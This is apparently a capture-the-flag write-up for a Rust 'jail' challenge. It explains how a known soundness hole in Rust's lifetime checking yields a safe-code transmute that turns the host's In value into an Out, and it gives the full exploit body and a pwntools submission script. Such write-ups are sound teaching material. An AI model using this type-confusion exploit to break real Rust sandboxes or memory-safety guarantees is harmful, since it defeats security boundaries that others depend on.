# blazinglyfast

**Category:** Jail

## Description

> 'Safe Rust is the true Rust programming language. If all you do is write Safe Rust, you will never have to worry about type-safety or memory-safety. You will never endure a dangling pointer, a use-after-free, or any other kind of Undefined Behavior (a.k.a. UB)' - Rustonomicon

Remote service:

```text
ncat --ssl blazinglyfast.opus4-7.b01le.rs 8443
```

The service asks for only the body of:

```rust
pub fn jail(input: In) -> Out { ... }
```

and compiles it under a heavily restricted Rust environment.

## Overview

This challenge is a Rust jail whose entire point is to break the assumption that “safe Rust” automatically implies soundness in every situation.

At first, the challenge looks like a normal sandbox: we are given an opaque `input: In`, must return an `Out`, and the server will only print the flag if our returned value passes several internal checks. The obvious approaches do not work:

- We cannot access private fields of `In` or `Out`
- We cannot use `unsafe`
- We cannot use `std`
- We cannot define traits or impl blocks
- We cannot directly reconstruct the expected `Out` value

The important observation is that the challenge host already gives us a *valid secret object* through `seed()`. The object is typed as `In`, but internally it has the same runtime layout as `Out`. So the real task is not “find the secret” but “reinterpret the secret as another type using only safe Rust”.

That makes this a type-confusion / soundness-bug challenge rather than a normal sandbox-escape challenge.

## Technical details

From the challenge source, the host defines two private internal structs:

```rust
#[repr(C)]
struct SecretIn {
    gate: GateIn,
    cookie: CookieIn,
    folded: u64,
    pair: [u64; 2],
}

#[repr(C)]
struct SecretOut {
    gate: GateOut,
    cookie: CookieOut,
    folded: u64,
    pair: [u64; 2],
}
```

They are then wrapped as public opaque types:

```rust
#[repr(C)]
pub struct In(SecretIn);

#[repr(C)]
pub struct Out(SecretOut);
```

The important detail is that the wrapper field types are also layout-compatible:

- `GateIn(fn() -> &'static str)` and `GateOut(fn() -> &'static str)`
- `CookieIn(u64)` and `CookieOut(u64)`

These wrappers are layout-compatible, so they do not change the runtime representation. As a result:

- `SecretIn` and `SecretOut` are layout-identical
- `In` and `Out` are layout-identical

The host builds the input using a function equivalent to:

```rust
pub fn seed() -> In
```

and validates the return value using:

```rust
pub fn check(out: Out)
```

The `check()` function verifies that the returned object contains:

1. the expected function pointer
2. the expected cookie
3. the expected folded checksum
4. the expected pair values

If everything matches, it prints the per-run secret token, and the wrapper script reveals the flag.

The key insight is that `seed()` already creates the exact bytes that `check()` wants. The only difference is the type: `seed()` returns `In`, while `check()` expects `Out`.

So the solve is to build a **safe-Rust transmute primitive** using a Rust soundness hole. A classic pattern is:

- store `A` and `B` in different enum variants
- keep a mutable reference into one variant
- widen its lifetime through a function-pointer/lifetime trick
- overwrite the enum with the other variant
- read back the value as the wrong type

That lets us reinterpret `In` as `Out` without using `unsafe`, field access, or raw pointers.

## Proof-of-Concept

Exploit body submitted to the jail:

```rust
enum E<A, B> {
    A(Option<Box<A>>),
    B(Option<Box<B>>),
}

static UNIT: &'static &'static () = &&();

fn widen_mut<'a, 'b, T>(_: &'a &'b (), x: &'b mut T, _: &()) -> &'a mut T {
    x
}

fn expand_mut<'a, 'b, T>(x: &'a mut T) -> &'b mut T {
    let f: fn(_, &'a mut T, &()) -> &'b mut T = widen_mut;
    f(UNIT, x, &())
}

fn transmute<A, B>(obj: A) -> B {
    fn inner<A, B>(e: &mut E<A, B>, obj: A) -> B {
        let E::B(slot) = e else { loop {} };
        let slot = expand_mut(slot);
        *e = E::A(Some(Box::new(obj)));
        core::hint::black_box(e);
        *slot.take().unwrap()
    }

    inner(core::hint::black_box(&mut E::B(None)), obj)
}

transmute(input)
```

Why this works:

- `input` already contains the valid secret state produced by the host
- `transmute(input)` does not compute a new value; it preserves the original bytes
- because `In` and `Out` are layout-compatible, the resulting `Out` passes every host check

Minimal pwntools script to submit the payload:

```python
from pwn import *

HOST = "blazinglyfast.opus4-7.b01le.rs"
PORT = 8443

payload = r'''
enum E<A, B> {
    A(Option<Box<A>>),
    B(Option<Box<B>>),
}

static UNIT: &'static &'static () = &&();

fn widen_mut<'a, 'b, T>(_: &'a &'b (), x: &'b mut T, _: &()) -> &'a mut T {
    x
}

fn expand_mut<'a, 'b, T>(x: &'a mut T) -> &'b mut T {
    let f: fn(_, &'a mut T, &()) -> &'b mut T = widen_mut;
    f(UNIT, x, &())
}

fn transmute<A, B>(obj: A) -> B {
    fn inner<A, B>(e: &mut E<A, B>, obj: A) -> B {
        let E::B(slot) = e else { loop {} };
        let slot = expand_mut(slot);
        *e = E::A(Some(Box::new(obj)));
        core::hint::black_box(e);
        *slot.take().unwrap()
    }

    inner(core::hint::black_box(&mut E::B(None)), obj)
}

transmute(input)
'''.strip()

io = remote(HOST, PORT, ssl=True)
io.recvuntil(b"Finish with EOF")
io.send(payload.encode() + b"\nEOF\n")
print(io.recvall(timeout=5).decode(errors="replace"))
```

Expected solve flow:

1. connect to the remote service
2. send only the function body
3. let the server compile and run it
4. `host::check()` accepts the forged `Out`
5. the service prints the secret token and returns the flag

## P/S

This challenge is a good reminder that “safe Rust” and “sound Rust” are not always the same thing.

The host tried to protect the secret by:

- hiding fields behind opaque types
- banning `unsafe`
- banning standard escape hatches like macros and traits

But the real weakness was deeper: the type system still allowed a path to reinterpret a value across two layout-compatible types.

The most important takeaway is:

- the challenge did **not** require recovering the secret at all
- the server itself handed us the correct bytes in `input`
- the entire problem was converting `In` into `Out` without changing those bytes

That is what made this challenge elegant: it looked like a sandbox, but it was really a language-soundness puzzle.
